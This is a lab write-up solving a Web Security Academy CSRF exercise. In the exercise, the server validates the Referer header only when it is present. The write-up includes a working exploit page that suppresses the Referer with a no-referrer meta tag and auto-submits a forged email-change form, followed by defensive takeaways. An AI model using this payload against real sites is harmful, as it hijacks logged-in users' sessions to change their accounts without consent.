# CSRF – Referer Validation Depends on Header Being Present

(**Web Security Academy**)

This lab demonstrates how **Referer-based CSRF protections can be bypassed** when an application **only validates the Referer header if it exists**, but allows requests to proceed when the header is missing.

---

## Lab: CSRF Where Referer Validation Depends on Header Being Present

**Category:** Cross-Site Request Forgery (CSRF)
**Protection Mechanism:** Referer header validation
**Difficulty:** Practitioner
**Tools Used:** Burp Suite Community Edition
**Status:** Solved

---

## What This Lab Is About

The application attempts to prevent CSRF attacks by checking the `Referer` HTTP header to ensure that requests originate from the same domain.

However, the implementation is flawed:

* Requests **with an invalid Referer** are blocked
* Requests **without a Referer header at all** are accepted

This creates an insecure fallback that allows CSRF attacks by **suppressing the Referer header entirely**.

---

## Target Functionality

**Vulnerable endpoint:**

```http
POST /my-account/change-email
```

**Parameters:**

* `email`

There is **no CSRF token** protecting this endpoint.

---

## Key Observations

### 1. Referer Header Is Used as the Only Defense

From the captured request in Burp Proxy:

* A valid Referer → request accepted
* Modified Referer domain → request rejected
* **No Referer header → request accepted**

This confirms that the server logic resembles:

```text
IF Referer exists:
    validate domain
ELSE:
    allow request
```

This is an insecure design.

---

### 2. Browsers Allow Suppressing the Referer Header

Modern browsers support suppressing the Referer header using HTML metadata:

```html
<meta name="referrer" content="no-referrer">
```

This forces the browser to **omit the Referer header entirely**, triggering the insecure fallback on the server.

---

## CSRF Exploit Payload

Hosted on the exploit server:

```html
<meta name="referrer" content="no-referrer">

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-referer@web-security-academy.net">
</form>

<script>
    document.forms[0].submit();
</script>
```

---

## Why This Works

* The browser sends **no Referer header**
* Server does not enforce CSRF protection when Referer is missing
* Session cookie is automatically included
* Request is treated as legitimate
* Email address is changed successfully

---

## Attack Flow

1. Victim is logged in
2. Victim visits attacker-controlled exploit page
3. Browser suppresses Referer header
4. Forged POST request is sent
5. Session cookie is included
6. Server skips Referer validation
7. Email address is changed

---

## Verification & Delivery

* Stored exploit on the exploit server
* Used **View exploit** to test locally
* Confirmed email change
* Updated email to avoid matching my own
* Clicked **Deliver exploit to victim**
* Lab marked as **Solved**

---

## Impact

An attacker can:

* Bypass Referer-based CSRF defenses
* Perform unauthorized state-changing actions
* Abuse authenticated user sessions

**Severity:** High

---

## Key Lessons Learned

* Referer-based CSRF protection is unreliable
* Missing headers must be treated as failures
* Browsers allow attackers to suppress Referer
* CSRF tokens are mandatory
* Header-based defenses alone are insufficient

---

## Defensive Takeaways

To prevent this vulnerability:

* Enforce CSRF tokens on all state-changing requests
* Reject requests **missing** Referer or Origin headers
* Validate Origin headers instead of Referer where possible
* Do not rely on optional headers for security
* Apply defense-in-depth

---

## Final Summary

* Referer validation was implemented incorrectly
* Requests without Referer were trusted
* Browser metadata suppressed the Referer header
* CSRF attack succeeded
* Victim’s email was changed
* Lab solved using Burp Suite Community Edition
 
